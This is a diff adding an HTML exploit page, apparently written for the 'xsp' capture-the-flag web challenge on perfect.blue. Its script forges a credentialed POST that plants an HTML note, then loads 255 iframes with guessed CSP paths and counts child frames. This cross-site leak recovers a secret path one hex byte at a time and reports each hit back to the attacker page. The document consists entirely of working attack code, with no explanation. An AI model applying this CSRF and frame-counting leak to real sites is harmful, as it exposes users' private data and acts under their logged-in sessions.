@@ -1,0 +1,51 @@
+<html>
+    <head>
+
+    </head>
+    <body>
+        <div id=attack>
+
+        </div>
+        <script>
+            function loadcb(e){
+                let fr = e.path[0]
+
+                if(fr.contentWindow.length > 0){
+                    fetch("?hit="+fr.id);
+                }
+            }
+
+            function addf(p){
+                let fr = document.createElement("iframe");
+                fr.src = list_endpoint;
+                fr.onload = loadcb;
+                fr.id = p;
+                fr.csp = `default-src 'none'; script-src https://xsp.chal.perfect.blue/notes.js 
+https://xsp.chal.perfect.blue/data/6f/2d/ab/fd/c5/a1/96/6b/b6/2c/fc/51/42/67/45/${p}`
+                attack.appendChild(fr);
+            }
+
+            let list_endpoint = "https://xsp.chal.perfect.blue/notes";
+            let add_endpoint = "https://xsp.chal.perfect.blue/add";
+
+            let html_payload = "<iframe>LOL</iframe>";
+            fetch(add_endpoint,
+                {
+                "body":`name=dd&data=${html_payload}`
+                ,"headers":{
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                }
+                ,"mode":"no-cors"
+                ,"credentials":"include"
+                ,"method":"POST"
+            });
+
+
+
+            for(let i=0;i<255;i++){
+                let p = i.toString(16);
+                addf(p);
+            }
+        </script>
+    </body>
+</html>
